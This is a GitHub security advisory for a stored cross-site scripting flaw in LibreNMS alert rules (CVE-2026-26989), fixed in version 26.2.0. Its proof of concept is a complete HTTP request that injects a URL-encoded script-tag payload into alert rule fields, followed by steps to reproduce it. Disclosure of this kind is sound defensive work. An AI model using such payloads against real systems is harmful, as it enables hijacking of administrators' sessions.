# [M] LibreNMS has a Stored XSS in Alert Rule

## Summary
Severity: Medium
Advisory: GHSA-6xmx-xr9p-58p7
CVE: CVE-2026-26989
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-02-18
Source: https://github.com/advisories/GHSA-6xmx-xr9p-58p7
Type: github-advisory

## Affected
- Packagist: `librenms/librenms` — affected >=0 <26.2.0

## Details
### Summary
A stored Cross-Site Scripting (XSS) vulnerability exists in LibreNMS (<= 25.12.0) in the creation of Alert Rules. This allows a user with the admin role to inject malicious JavaScript, which will be executed when the alert rules page is viewed.

### Details
The stored JavaScript is displayed at line 63 of `inlcudes/html/modal/alert_rule_list.inc.php`.
```
<td><i>" . e($rule_display) . "</i></td>
```

### PoC

Request PoC:
```
POST /alert-rule HTTP/1.1
Host: 192.168.236.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-CSRF-TOKEN: FaBY9sq0bzXpc3mlsvyRdvg0PLInwBXPnEhHNrZF
X-Requested-With: XMLHttpRequest
Content-Length: 718
Origin: http://192.168.236.131
Connection: keep-alive
Referer: http://192.168.236.131/device/device=1/tab=edit/section=alert-rules
Cookie: XSRF-TOKEN=eyJpdiI6ImhpdDNwV29nZE1lYzc0NGxyK2dGK2c9PSIsInZhbHVlIjoiUkpXUUlMYTZwT2VaZmNPZExKcHNLQWxwOFVjaGM3Z2hzNVBSa2thTEluSDdBL3Q0amVURGp1Q0tjYm15akw1QmJacDRqY3Y1eTNzS3l1VSsvcjVUaTRIalBKQzVpUlRySktLTHlnTHQxa29NNzlxaXMxQzdsalpUeDNaWTRKSjkiLCJtYWMiOiIwZGQ4ZmEzZmFmZTJkOGIyZWIxOGVhZjE0MTU4ZWI5ZjFlYTI0Y2NkNjcwYTU2Y2JkMTM5MDAxZDg1YWIzY2M5IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImVWbzBKRU9IaURzOUJ6OVNjREVGbFE9PSIsInZhbHVlIjoiRlJPckhRRG4yZjFiUjdGMlZTUXlhNXArT0pMcUdQY3RaV1EvRWJZdGNWUFUzYjhVaWxLS1hFclpacmFHOGQyNllFaGF1ckRYQWZKNHdzNEQ5RHFmdzh3WEY3UFZvdGlqc3RQVUc2Mk1QYTZ0c045YWt0TG0rS2ttU0ZpV3NQMXkiLCJtYWMiOiI1YWM1OWM5MGMwOTcyNDk2OTU1NTBlY2ExZjQ4M2M1YmQ3ZWFlNzQ5NDVmZTgxOTEyMjNkNjJhM2EzZjY1OWE5IiwidGFnIjoiIn0%3D
Priority: u=0

_token=FaBY9sq0bzXpc3mlsvyRdvg0PLInwBXPnEhHNrZF&device_id=1&device_name=127.0.0.1&rule_id=&builder_json=%7B%22condition%22%3A%22AND%22%2C%22rules%22%3A%5B%7B%22id%22%3A%22access_points.accesspoint_id%22%2C%22field%22%3A%22access_points.accesspoint_id%22%2C%22type%22%3A%22string%22%2C%22input%22%3A%22text%22%2C%22operator%22%3A%22equal%22%2C%22value%22%3A%22%3Cscript%3Ealert(%5C%22xss%5C%22)%3C%2Fscript%3E%22%7D%5D%2C%22valid%22%3Atrue%7D&name=Test+rule&builder_rule_0_filter=access_points.accesspoint_id&builder_rule_0_operator=equal&builder_rule_0_value_0=%3Cscript%3Ealert(%22xss%22)%3C%2Fscript%3E&severity=warning&count=1&delay=1m&interval=5m&recovery=on&acknowledgement=on&maps%5B%5D=1&proc=&notes=&adv_query=
```

Steps to reproduce:
1. Create and save an alert rule within a device with the following values:
<img width="893" height="325" alt="image" src="https://github.com/user-attachments/assets/33bdb9a6-7c6c-4fd4-9e8e-b845cf9600ea" />

2. Injected JavaScript is executed:
<img width="1104" height="565" alt="image" src="https://github.com/user-attachments/assets/3d45c686-72e4-458a-93f6-e7fb749b966b" />



### Impact
Type: Stored Cross-Site Scripting (XSS)
Affected users: Only accounts with the admin role which can edit a device's alert rules are affected.
Attackers need: Authenticated admin-level access.

## References
- https://github.com/librenms/librenms/security/advisories/GHSA-6xmx-xr9p-58p7
- https://nvd.nist.gov/vuln/detail/CVE-2026-26989
- https://github.com/librenms/librenms/pull/19039
- https://github.com/librenms/librenms/commit/087608cf9f851189847cb8e8e5ad002e59170c58
- https://github.com/librenms/librenms
- https://github.com/librenms/librenms/releases/tag/26.2.0
